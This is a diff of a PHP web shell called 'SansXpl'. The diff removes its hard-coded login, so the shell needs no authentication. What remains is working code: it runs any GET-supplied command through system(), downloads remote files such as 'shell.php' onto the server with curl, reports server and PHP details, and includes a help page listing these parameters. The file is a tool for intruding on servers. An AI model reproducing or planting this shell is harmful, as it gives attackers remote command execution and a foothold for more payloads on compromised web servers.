@@ -1,14 +1,5 @@
 <?php
 
-$user = "sansxpl";
-$pass = "sxpl69";
-
-if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))
-{
-		header("WWW-Authenticate: Basic realm=\"Login\"");
-		header("HTTP/1.0 401 Unauthorized");
-		exit();
-}
 
 $style = "
 <style>
@@ -296,107 +287,109 @@ echo $style;
 echo $guiscript;
 ?>
 
+
+
+
 <div class="center font">
 <pre style="font-size:large;">
 <?php
+
+
 echo $banner;
 
-		if (isset($_GET['gui'])) {
-			echo $guibtn;
-		}
-		if (isset($_GET['gui']) && isset($_GET['cmd'])) {
-			echo $guicmd;
-		}
-		if (isset($_GET['gui']) && isset($_GET['curl'])) {
-			echo $guicurl;
-		}
-		else if (isset($_GET['name']) && isset($_GET['url'])) {
-			echo '<title>SansXpl - Curl Download</title>';
-			set_time_limit(0);
-			$fp = fopen ($_GET['name'], 'w+');
-			$url = $_GET['url'];
-			$ch = curl_init(str_replace(" ","%20",$url));
-			curl_setopt($ch, CURLOPT_TIMEOUT, 50);
-			curl_setopt($ch, CURLOPT_FILE, $fp);
-			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-			$data = curl_exec($ch);
-			curl_close($ch);
+if (isset($_GET['gui'])) {
+	echo $guibtn;
+}
+if (isset($_GET['gui']) && isset($_GET['cmd'])) {
+	echo $guicmd;
+}
+if (isset($_GET['gui']) && isset($_GET['curl'])) {
+	echo $guicurl;
+}
+else if (isset($_GET['name']) && isset($_GET['url'])) {
+	echo '<title>SansXpl - Curl Download</title>';
+	set_time_limit(0);
+	$fp = fopen ($_GET['name'], 'w+');
+	$url = $_GET['url'];
+	$ch = curl_init(str_replace(" ","%20",$url));
+	curl_setopt($ch, CURLOPT_TIMEOUT, 50);
+	curl_setopt($ch, CURLOPT_FILE, $fp);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+	$data = curl_exec($ch);
+	curl_close($ch);
 
-			$filesize = filesize($_GET['name']); // Get file size in bytes
-			$base_url = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
-			$base_url .= "://".$_SERVER['HTTP_HOST'].dirname($_SERVER['REQUEST_URI']);
-			$parsed_url = parse_url($base_url);
-			$base_url = $parsed_url['scheme'] . "://" . $parsed_url['host'] . dirname($parsed_url['path']);
+	$filesize = filesize($_GET['name']); // Get file size in bytes
+	$base_url = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
+	$base_url .= "://".$_SERVER['HTTP_HOST'].dirname($_SERVER['REQUEST_URI']);
+	$parsed_url = parse_url($base_url);
+	$base_url = $parsed_url['scheme'] . "://" . $parsed_url['host'] . dirname($parsed_url['path']);
 
-			echo '<center><b>---------------[ CURL DOWNLOAD ]---------------</b></center>';
-			echo '<br>Status    : '.($data ? 'DONE!' : 'FAILED!');
-			echo '<br>Name File : '.$_GET['name'];
-			echo '<br>File URL  : '.$_GET['url'];
-			echo '<br>File Size : '.formatBytes($filesize); // Display file size in a human-readable format
-			echo '<br>File Loc  : <a target="_blank" href="'.$base_url.'/'.$_GET['name'].'">'.$base_url.'/'.$_GET['name'].'</a>';
-			echo '<br><center><b>----------------------------------------------</b></center>';
+	echo '<center><b>---------------[ CURL DOWNLOAD ]---------------</b></center>';
+	echo '<br>Status    : '.($data ? 'DONE!' : 'FAILED!');
+	echo '<br>Name File : '.$_GET['name'];
+	echo '<br>File URL  : '.$_GET['url'];
+	echo '<br>File Size : '.formatBytes($filesize); // Display file size in a human-readable format
+	echo '<br>File Loc  : <a target="_blank" href="'.$base_url.'/'.$_GET['name'].'">'.$base_url.'/'.$_GET['name'].'</a>';
+	echo '<br><center><b>----------------------------------------------</b></center>';
 
-		} else if(isset($_GET['cmd'])) {
-			$command = $_GET['cmd'];
-			if ($_GET['cmd'] == ''){
-				$command = 'echo "CMD Shell by SansXpl"';
-			}
-			echo '<title>SansXpl - Command Shell</title>';
-			echo "<center><b>-----------------[ CMD OUTPUT ]-----------------</b></center><br>";
-			echo '<div style=" height:400px; overflow-x:auto;">';
-			system($command);
-			echo '</div>';
-			echo "<center><b>------------------------------------------------</b></center>";
+} else if(isset($_GET['cmd'])) {
+	$command = $_GET['cmd'];
+	if ($_GET['cmd'] == ''){
+		$command = 'echo "CMD Shell by SansXpl"';
+	}
+	echo '<title>SansXpl - Command Shell</title>';
+	echo "<center><b>-----------------[ CMD OUTPUT ]-----------------</b></center><br>";
+	echo '<div style=" height:400px; overflow-x:auto;">';
+	system($command);
+	echo '</div>';
+	echo "<center><b>------------------------------------------------</b></center>";
 
-		} else if(isset($_GET['server'])) {
-			echo '<title>SansXpl - Server Info</title>';
-			echo "<center><b>------------------[ SERVER INFO ]------------------</b></center>";
-			echo '<br>Uname     : '.php_uname();
-			echo '<br>PHP Ver   : '.PHP_VERSION;
-			echo '<br>Server IP : '.gethostbyname($_SERVER['HTTP_HOST']);
-			echo '<br>Client IP : '.getUserIpAddr();
-			echo '<br>User Info : '.@get_current_user().' ('.@getmyuid().') | Group: ? ('.@getmygid().')';
-			echo "<br><center><b>-----------------------------------------------</b></center>";
+} else if(isset($_GET['server'])) {
+	echo '<title>SansXpl - Server Info</title>';
+	echo "<center><b>------------------[ SERVER INFO ]------------------</b></center>";
+	echo '<br>Uname     : '.php_uname();
+	echo '<br>PHP Ver   : '.PHP_VERSION;
+	echo '<br>Server IP : '.gethostbyname($_SERVER['HTTP_HOST']);
+	echo '<br>Client IP : '.getUserIpAddr();
+	echo '<br>User Info : '.@get_current_user().' ('.@getmyuid().') | Group: ? ('.@getmygid().')';
+	echo "<br><center><b>-----------------------------------------------</b></center>";
 
-		} else if(isset($_GET['phpinfo'])) {
-			echo '<title>SansXpl - PHP Info</title>';
-			echo "<center><b>------------------[ PHP INFO ]------------------</b></center>";
-			echo getPhpInfo();
+} else if(isset($_GET['phpinfo'])) {
+	echo '<title>SansXpl - PHP Info</title>';
+	echo "<center><b>------------------[ PHP INFO ]------------------</b></center>";
+	echo getPhpInfo();
 
-		} else if(isset($_GET['help'])) {
-			echo '<title>SansXpl - Help Command</title>';
-			echo '<center><b>----------------[ COMMAND LIST ]----------------</b></center>
+} else if(isset($_GET['help'])) {
+	echo '<title>SansXpl - Help Command</title>';
+	echo '<center><b>----------------[ COMMAND LIST ]----------------</b></center>
 
 <b>For Help Input:</b> help or cmd=help
 
 <b>Usage:</b>
-   ?cmd=uname+-a
-   ?name=shell.php
-   ?url=http://localhost/shell.php
+?cmd=uname+-a
+?name=shell.php
+?url=http://localhost/shell.php
 
 <b>Multi Param:</b>
-   ?login&gui
-   ?login&gui&name=file.txt&url=(url)/file.txt
+?login&gui
+?login&gui&name=file.txt&url=(url)/file.txt
 
 <b>Command Param:</b>
-   <b>?cmd=</b>      execute command shell
-   <b>?name=</b>     set curl filename
-   <b>?url=</b>      set curl file url
+<b>?cmd=</b>      execute command shell
+<b>?name=</b>     set curl filename
+<b>?url=</b>      set curl file url
 
-   <b>?gui</b>       GUI mode
-   <b>?server</b>    Show Server Info
-   <b>?phpinfo</b>   Show PHP Info
+<b>?gui</b>       GUI mode
+<b>?server</b>    Show Server Info
+<b>?phpinfo</b>   Show PHP Info
 
-   <b>?login</b>     login into shell
-   <b>?logout</b>    clear login data
+<b>?login</b>     login into shell
+<b>?logout</b>    clear login data
 
 <center><b>------------------------------------------------</b></center>
-			';
-		}
-
-	}
+	';
+}
 ?>
 </pre>
 </div>
-
 
